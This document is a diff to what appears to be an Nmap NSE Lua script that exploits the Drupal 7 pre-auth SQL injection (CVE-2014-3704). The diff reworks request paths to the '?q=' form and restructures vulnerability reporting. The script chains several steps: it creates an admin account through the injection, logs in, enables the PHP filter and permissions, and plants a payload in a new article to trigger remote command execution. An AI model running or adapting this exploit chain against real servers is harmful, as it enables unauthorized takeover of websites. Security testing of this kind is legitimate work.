@@ -215,10 +215,12 @@ local function do_sql_query(host, port, uri, user)
       ['Content-Type'] = "application/x-www-form-urlencoded"
     }
   }
-  local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
-  --TODO: Check return status
+  local res = http.post(host, port, uri .. "?q=/user/login", opt, nil, r)
 
-  return user, passwd
+  if string.match(res.body, "includes[\\/]database[\\/]database%.inc") and string.match(res.body, "addcslashes%(%)") then
+    return user, passwd
+  end
+
 end
 
 local function set_php_filter(host, port, uri, session, disable)
@@ -233,7 +235,7 @@ local function set_php_filter(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/modules", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/modules", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -253,7 +255,7 @@ local function set_php_filter(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'system_modules'
   data['op'] = 'Save configuration'
-  res = http.post(host, port, uri .. "/admin/modules/list/confirm", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/modules/list/confirm", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -271,7 +273,7 @@ local function set_permission(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/people/permissions", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/people/permissions", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -291,7 +293,7 @@ local function set_permission(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'user_admin_permissions'
   data['op'] = 'Save permissions'
-  res = http.post(host, port, uri .. "/admin/people/permissions", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/people/permissions", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -305,7 +307,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
   -- add new Content page & trigger RCE
   stdnse.debug(1, string.format("%s", "creating new article page with planted payload"))
 
-  local res = http.get(host, port, uri .. "/node/add/article", opt)
+  local res = http.get(host, port, uri .. "?q=/node/add/article", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -327,7 +329,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
   }
   local body = multipart_build_body(files, boundary)
 
-  res = http.post(host, port, uri .. "/node/add/article", opt, nil, body)
+  res = http.post(host, port, uri .. "?q=/node/add/article", opt, nil, body)
   if res == nil then return nil end
 
   return res.body, pattern
@@ -342,9 +344,37 @@ action = function(host, port)
     cleanup = "false"
   end
 
+  local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
+  local vuln = {
+    title = 'Drupal - pre Auth SQL Injection Vulnerability',
+    state = vulns.STATE.NOT_VULN,
+    description = [[
+  The expandArguments function in the database abstraction API in
+  Drupal core 7.x before 7.32 does not properly construct prepared
+  statements, which allows remote attackers to conduct SQL injection
+  attacks via an array containing crafted keys.
+    ]],
+    IDS = {CVE = 'CVE-2014-3704'},
+    references = {
+      'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
+      'https://www.drupal.org/SA-CORE-2014-005',
+      'http://www.securityfocus.com/bid/70595',
+    },
+    dates = {
+      disclosure = {year = '2014', month = '10', day = '15'},
+    },
+  }
+
   local user, passwd = do_sql_query(host, port, uri, nil)
 
+  if user == nil or passwd == nil then
+    return vulnReport:make_output(vuln)
+  end
+
   stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
+
+  vuln.state = vulns.STATE.EXPLOIT
+
   local data = {
     ['name'] = user,
     ['pass'] = passwd,
@@ -352,31 +382,11 @@ action = function(host, port)
     ['op'] = 'Log in',
   }
 
-  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
+  local res = http.post(host, port, uri .. "?q=/user/login", nil, nil, data)
 
   if res.status == 302 and res.cookies[1].name ~= nil then
-    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
-    local vuln = {
-      title = 'Drupal - pre Auth SQL Injection Vulnerability',
-      state = vulns.STATE.NOT_VULN,
-      description = [[
-The expandArguments function in the database abstraction API in
-Drupal core 7.x before 7.32 does not properly construct prepared
-statements, which allows remote attackers to conduct SQL injection
-attacks via an array containing crafted keys.
-      ]],
-      IDS = {CVE = 'CVE-2014-3704'},
-      references = {
-        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
-        'https://www.drupal.org/SA-CORE-2014-005',
-        'http://www.securityfocus.com/bid/70595',
-      },
-      dates = {
-        disclosure = {year = '2014', month = '10', day = '15'},
-      },
-    }
+
     stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
-    vuln.state = vulns.STATE.EXPLOIT
 
     if cmd ~= nil then
       local session = {}
@@ -406,11 +416,16 @@ attacks via an array containing crafted keys.
       end
     end
 
-    -- cleanup: remove admin user
-    if cleanup == nil then
-      do_sql_query(host, port, uri, user)
-    end
-
-    return vulnReport:make_output(vuln)
+  else
+    vuln.state = vulns.STATE.LIKELY_VULN
+    vuln.check_results = "Account created but unable to log in."
   end
+
+  -- cleanup: remove admin user
+  if cleanup == nil then
+    do_sql_query(host, port, uri, user)
+  end
+
+  return vulnReport:make_output(vuln)
+
 end
